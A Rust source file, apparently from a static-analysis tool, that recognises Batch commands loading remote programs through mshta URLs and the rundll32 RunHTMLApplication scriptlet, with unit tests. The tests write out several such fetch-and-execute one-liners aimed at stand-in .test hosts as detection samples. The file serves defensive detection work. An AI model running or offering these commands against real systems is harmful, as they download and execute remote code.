//! Explicit remote-program targets (`mshta <url>`, the `rundll32`
//! `RunHTMLApplication` scriptlet) in retained Batch command-site facts.
//! No CMD expansion, JavaScript evaluation, COM activation or fetch runs here.

use filefacts::{RefKind, RefLocator, Reference};

use super::Discovery;
use super::UnresolvedFetchCall;
use crate::fetch::is_http_url;

/// The most command sites filefacts records for one file.
const MAX_SITES: usize = 128;
/// The longest command site filefacts records.
const MAX_SITE_BYTES: usize = 65_536;

/// A command word's program name, lower-cased: `C:\Windows\mshta.exe` runs
/// `mshta.exe`.
fn tool(name: &str) -> String {
    name.rsplit(['/', '\\'])
        .next()
        .unwrap_or(name)
        .to_ascii_lowercase()
}

fn quoted(input: &str) -> Option<(&str, &str)> {
    let input = input.strip_prefix('"')?;
    let end = input.find('"')?;
    Some((&input[..end], &input[end + 1..]))
}

fn first_argument(input: &str) -> Option<&str> {
    let input = input.trim_start();
    if input.starts_with('"') {
        return quoted(input).and_then(|(arg, tail)| {
            (tail.is_empty() || tail.starts_with(char::is_whitespace)).then_some(arg)
        });
    }
    input.split_whitespace().next()
}

/// The target of a `GetObject("script:<target>")` call that ends the input.
fn moniker(input: &str) -> Option<&str> {
    let rest = input
        .strip_prefix("GetObject")?
        .trim_start()
        .strip_prefix('(')?
        .trim_start();
    let quote = rest.chars().next()?;
    if !matches!(quote, '\'' | '"') {
        return None;
    }
    let inside = &rest[1..];
    let end = inside.find(quote)?;
    let (literal, rest) = (&inside[..end], &inside[end + 1..]);
    if !matches!(rest.trim(), ")" | ");") {
        return None;
    }
    let (scheme, target) = literal.split_once(':')?;
    scheme.eq_ignore_ascii_case("script").then_some(target)
}

/// The script a `rundll32 javascript:"\..\mshtml,RunHTMLApplication";…`
/// scriptlet loads.
fn scriptlet(input: &str) -> Option<&str> {
    let input = input.trim_start();
    if !input.get(..11)?.eq_ignore_ascii_case("javascript:") {
        return None;
    }
    let (bridge, rest) = quoted(&input[11..])?;
    let bridge = bridge.to_ascii_lowercase();
    if bridge.contains(['%', '!', '^']) || !bridge.ends_with("mshtml,runhtmlapplication") {
        return None;
    }
    let prefix = &bridge[..bridge.len() - "mshtml,runhtmlapplication".len()];
    if !prefix.chars().all(|c| matches!(c, '\\' | '/' | '.')) {
        return None;
    }
    let rest = rest.trim_start().strip_prefix(';')?.trim_start();
    let rest = rest
        .strip_prefix("document.write();")
        .unwrap_or(rest)
        .trim_start();
    moniker(rest)
}

/// Remote programs the command sites of a Batch file's `values` load, and
/// the sites whose target is a runtime value. The tree is filefacts' values
/// JSON, read by path since filefacts exposes no typed view of it.
pub(super) fn discover(values: &serde_json::Value) -> Discovery {
    let mut out = Discovery::default();
    let batch = values.pointer("/source/batch");
    if batch
        .and_then(|v| v.get("command_sites_truncated"))
        .and_then(serde_json::Value::as_bool)
        == Some(true)
    {
        out.truncated = true;
        tracing::debug!(
            recognizer = "batch",
            limit = "filefacts command sites",
            "command sites were truncated at extraction; later sites are not read"
        );
    }
    let Some(sites) = batch
        .and_then(|v| v.get("command_sites"))
        .and_then(serde_json::Value::as_array)
    else {
        return out;
    };
    if sites.len() > MAX_SITES {
        out.truncated = true;
        tracing::debug!(
            recognizer = "batch",
            limit = MAX_SITES,
            sites = sites.len(),
            "more command sites than filefacts records; the rest are not read"
        );
    }
    for site in sites.iter().take(MAX_SITES) {
        site_targets(site, &mut out);
    }
    out
}

/// The remote program one command site loads, or the gap when its target is
/// a runtime value.
fn site_targets(site: &serde_json::Value, out: &mut Discovery) {
    let (Some(name), Some(text), Some(offset), Some(name_offset), Some(name_end)) = (
        site["name"].as_str(),
        site["text"].as_str(),
        site["offset"].as_u64(),
        site["name_offset"].as_u64(),
        site["name_end"].as_u64(),
    ) else {
        return;
    };
    let relative = |at: u64| at.checked_sub(offset).and_then(|x| usize::try_from(x).ok());
    let (Some(start), Some(end)) = (relative(name_offset), relative(name_end)) else {
        return;
    };
    if text.len() > MAX_SITE_BYTES
        || text.get(start..end) != Some(name)
        || !matches!(text.get(..start).map(str::trim), Some("" | "@"))
    {
        return;
    }
    let Some(tail) = text.get(end..) else {
        return;
    };
    let program = tool(name);
    let target = match program.as_str() {
        "mshta" | "mshta.exe" => first_argument(tail),
        "rundll32" | "rundll32.exe" => scriptlet(tail),
        _ => return,
    };
    // A CMD expansion or quote left in the target is a runtime value.
    if let Some(target) = target.filter(|target| {
        !target.contains(['%', '!', '^', '\\', '"', '\'', '\r', '\n']) && is_http_url(target)
    }) {
        let mut reference = Reference::new(
            RefLocator::Url(target.to_owned()),
            RefKind::Dependency,
            "ast-batch-program",
            text,
        );
        reference.offset = text
            .find(target)
            .and_then(|at| offset.checked_add(at as u64));
        out.references.push(reference);
        return;
    }
    let candidate = tail.trim_start();
    if candidate.contains(['%', '!', '^'])
        || candidate
            .get(..11)
            .is_some_and(|p| p.eq_ignore_ascii_case("javascript:"))
            && candidate.contains("GetObject(")
    {
        out.unresolved.push(UnresolvedFetchCall {
            command: program,
            offset: Some(offset),
        });
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn run(source: &str) -> Discovery {
        let parsed = filefacts::OpenOptions::new()
            .file_type(filefacts::FileType::Batch)
            .open(source.as_bytes());
        discover(parsed.values().as_json())
    }

    #[test]
    fn remote_programs_have_literal_offsets_and_dependency_role() {
        for source in [
            "mshta https://program.test/stage.hta",
            "@MSHTA.EXE \"https://program.test/stage.hta\" argument\n",
            "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();GetObject(\"script:https://program.test/stage.wsf\")",
        ] {
            let result = run(source);
            assert_eq!(result.references.len(), 1, "{source}");
            let r = &result.references[0];
            assert_eq!(r.kind, RefKind::Dependency);
            assert_eq!(r.offset, Some(source.find("https://").unwrap() as u64));
            assert!(result.unresolved.is_empty() && !result.truncated);
        }
    }

    #[test]
    fn printed_comments_data_and_other_dll_commands_are_not_program_fetches() {
        for source in [
            "rem mshta https://printed.test/a.hta\n",
            "echo mshta https://printed.test/a.hta\n",
            "echo rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";GetObject(\"script:https://printed.test/a.wsf\")\n",
            "rundll32.exe printui.dll,PrintUIEntry https://data.test/a.wsf\n",
            "mshta local.hta\n",
            "mshta /?\n",
        ] {
            assert!(run(source).references.is_empty(), "{source}");
        }
    }

    #[test]
    fn unknown_targets_are_gaps_without_argument_disclosure() {
        for source in [
            "mshta %PRIVATE_URL%\n",
            "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";GetObject(secretValue)\n",
        ] {
            let result = run(source);
            assert!(result.references.is_empty());
            assert_eq!(result.unresolved.len(), 1);
            assert!(!format!("{result:?}").contains("PRIVATE_URL"));
        }
    }

    #[test]
    fn truncated_sites_are_reported_as_truncation_not_as_a_call() {
        let truncated =
            discover(&serde_json::json!({"source":{"batch":{"command_sites_truncated":true}}}));
        assert!(truncated.truncated);
        assert!(truncated.unresolved.is_empty() && truncated.references.is_empty());

        let site = serde_json::json!({"name": "mshta", "text": "mshta https://p.test/a.hta",
            "offset": 0, "name_offset": 0, "name_end": 5});
        let sites = vec![site; MAX_SITES + 1];
        let many = discover(&serde_json::json!({"source":{"batch":{"command_sites": sites}}}));
        assert!(many.truncated);
        assert_eq!(many.references.len(), MAX_SITES);
    }
}
